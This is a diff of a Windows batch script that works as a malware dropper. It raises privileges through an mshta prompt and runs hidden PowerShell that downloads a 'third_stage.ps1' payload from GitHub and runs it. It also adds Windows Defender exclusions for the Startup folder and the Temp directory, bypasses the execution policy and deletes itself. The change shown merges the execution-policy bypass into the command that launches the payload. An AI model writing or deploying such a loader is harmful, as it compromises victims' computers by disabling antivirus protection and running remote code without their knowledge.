@@ -5,10 +5,9 @@ net file 1>NUL 2>NUL || start "" mshta vbscript:CreateObject("Shell.Application"
 
 REM Go smoothly
 powershell -windowstyle hidden -c "Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/experiments/main/third_stage.ps1' -OutFile './third_stage.ps1'"
-powershell -windowstyle hidden -c "& {Set-ExecutionPolicy -ExecutionPolicy Bypass -Force}"
 
-REM Add third stage and temp dir to exclusion paths for insurance
+REM Add third stage and temp dir to exclusion paths, set execution policy for insurance
 powershell -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:\Users\me\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\third_stage.ps1'"
-powershell -windowstyle hidden -c "Add-MpPreference -ExclusionPath '$env:Temp'; .\third_stage.ps1"
+powershell -windowstyle hidden -c "Add-MpPreference -ExclusionPath '$env:Temp'; Set-ExecutionPolicy -ExecutionPolicy Bypass -Force; .\third_stage.ps1"
 
 DEL %0
